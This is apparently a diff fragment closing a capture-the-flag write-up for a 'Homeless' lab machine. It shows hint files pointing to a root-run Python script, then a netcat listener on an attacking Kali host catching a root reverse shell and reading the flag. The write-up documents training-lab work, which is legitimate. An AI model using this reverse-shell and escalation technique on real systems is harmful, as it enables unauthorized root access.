@@ -14,3 +14,50 @@ IP/d5fa314e8577e3a7b8534a014b4dcb221de823ad
 
 Regards 
 http://www.facebook.com/l33twebhacker
+
+
+
+downfall@creatigon:~$ cat todo.txt 
+hey i am homeless guy. Now i living near python.
+
+Try Harder!
+
+Thanks. 
+
+
+downfall@creatigon:~$ cat .secret_message
+Hey.
+i am sleeping at /lib/logs/homeless.py
+
+
+wake me and root me..
+
+
+Thanks bro..
+
+
+root@kali:~/CTF/homeless# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [192.168.1.15] from (UNKNOWN) [192.168.1.13] 60238
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+ls
+flag.txt
+cat flag.txt
+Well done!.
+
+Woo! woo! woo. You Got it!..
+Really Appreciate to solve my challenge....
+
+This is my first time challenge..
+I hope next time will be more better than this one!...
+
+Thanks
+Min Ko Ko
+hi@creatigong.com
+
+http://www.creatigon.com
+http://www.mmsecurity.net
+https://www.facebook.com/l33twebhacker
+
